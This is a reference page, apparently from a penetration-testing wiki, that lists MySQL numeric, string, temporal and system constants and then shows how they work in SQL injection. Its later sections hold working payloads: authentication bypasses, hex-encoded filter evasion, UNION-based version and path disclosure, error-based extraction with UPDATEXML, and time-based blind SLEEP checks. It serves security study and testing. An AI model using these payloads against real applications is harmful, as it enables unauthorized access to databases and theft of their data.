---
title: Constants
description: MySQL constants and literals useful in SQL injection
category: Reference
order: 22
tags: ["constants", "literals", "reference"]
lastUpdated: 2025-03-15
---

## Constants

MySQL supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.

### Numeric Constants

MySQL supports several formats for numeric literals:

| Type                | Example         | Notes                     |
| ------------------- | --------------- | ------------------------- |
| Integer             | `1234`          | Regular integer           |
| Negative Integer    | `-123`          | Negative value            |
| Decimal             | `123.45`        | Decimal point notation    |
| Scientific Notation | `1.23e2`        | Same as 123.0             |
| Hexadecimal         | `0xFF`          | Same as 255               |
| Binary              | `0b1111`        | Same as 15 (MySQL 5.0.3+) |
| Boolean             | `true`, `false` | Same as 1 and 0           |

### String Constants

String literals can be represented in several ways:

| Type          | Example         | Notes                                       |
| ------------- | --------------- | ------------------------------------------- |
| Single Quote  | `'text'`        | Standard SQL string                         |
| Double Quote  | `"text"`        | Valid if `ANSI_QUOTES` SQL mode is disabled |
| Hex String    | `0x74657874`    | Hexadecimal representation of 'text'        |
| Binary String | `_binary'text'` | Binary string (MySQL 8.0+)                  |

### Temporal Constants

Date and time constants:

| Type      | Example                           | Notes                      |
| --------- | --------------------------------- | -------------------------- |
| Date      | `'2025-03-15'`                    | YYYY-MM-DD format          |
| Time      | `'15:30:45'`                      | HH:MM:SS format            |
| Datetime  | `'2025-03-15 15:30:45'`           | YYYY-MM-DD HH:MM:SS format |
| Timestamp | `TIMESTAMP '2025-03-15 15:30:45'` | ANSI SQL timestamp         |

### Special Constants

MySQL has several special values:

| Constant            | Description                                                                                                        |
| ------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `NULL`              | Represents a NULL value                                                                                            |
| `\N`                | NULL in LOAD DATA/SELECT INTO OUTFILE only; deprecated in 5.7.18, removed in 8.0                                   |
| `CURRENT_USER()`    | Returns authenticated account as `user@host` (username may be empty for anonymous connections, e.g., `@localhost`) |
| `DEFAULT`           | Used to specify default column value                                                                               |
| `CURRENT_TIMESTAMP` | Current date and time                                                                                              |
| `CURRENT_DATE`      | Current date                                                                                                       |
| `CURRENT_TIME`      | Current time                                                                                                       |

### System Constants

Some important MySQL system constants:

| Constant      | Description         | Example Value              |
| ------------- | ------------------- | -------------------------- |
| `@@version`   | MySQL version       | `8.0.27-0ubuntu0.20.04.1`  |
| `@@datadir`   | Data directory      | `/var/lib/mysql/`          |
| `@@hostname`  | Server hostname     | `db-server`                |
| `@@server_id` | Server ID           | `1`                        |
| `@@basedir`   | Base directory      | `/usr/`                    |
| `@@tmpdir`    | Temporary directory | `/tmp`                     |
| `@@port`      | MySQL port          | `3306`                     |
| `@@log_error` | Error log path      | `/var/log/mysql/error.log` |

### Boolean Expressions

Boolean expressions evaluate to 1 or 0:

| Expression         | Result    |
| ------------------ | --------- |
| `1=1`              | 1 (true)  |
| `1=0`              | 0 (false) |
| `NULL IS NULL`     | 1 (true)  |
| `NULL IS NOT NULL` | 0 (false) |

### Using Constants in SQL Injection

#### String Constants in Bypasses

```sql
-- Standard string
' OR 'a'='a

-- Hex string bypass
' OR 0x613d61 -- (a=a in hex)

-- Mixed approach
' OR 0x61='a' -- (a='a')
```

#### Numeric Constants in Bypasses

```sql
-- Boolean as number
' OR true -- (same as 1)

-- Hex number
' OR 0x1 -- (same as 1)

-- Mathematical expression
' OR 4-3 -- (evaluates to 1)
```

#### Practical Applications

##### Using Boolean Constants

```sql
-- Simple authentication bypass
' OR 1 -- -
' OR true -- -
' OR 1=1 -- -
```

##### Using String Constants

```sql
-- Hex-encoded bypass
' UNION SELECT 0x61646D696E -- - (selects 'admin')

-- Bypassing quote filters
SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'
```

##### Using System Constants

```sql
-- Information gathering
' UNION SELECT @@version, @@datadir -- -

-- Path disclosure
' UNION SELECT CONCAT(@@datadir,'/mysql/user.MYD') -- -
```

### Error-Based Injection with Constants

```sql
-- Using constants that cause errors
' AND UPDATEXML(1,CONCAT('~',@@version,'~'),1) -- -

-- Causing type conversion errors
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```

### Constants in Time-Based Attacks

```sql
-- Sleep only if condition is true
' AND IF(SUBSTR(@@version,1,1)='5',SLEEP(5),0) -- -

-- Using hex constants in time-based
' AND IF(SUBSTR(@@version,1,1)=0x35,SLEEP(5),0) -- - (checking for '5')
```

### Limitations and Considerations

1. Hex string literals are MySQL-specific and may not work in other databases
2. Some constants like `true`/`false` are case-insensitive
3. String constants are limited to available character encoding
4. Some system constants require specific privileges to access
5. Constants behavior can vary across MySQL versions
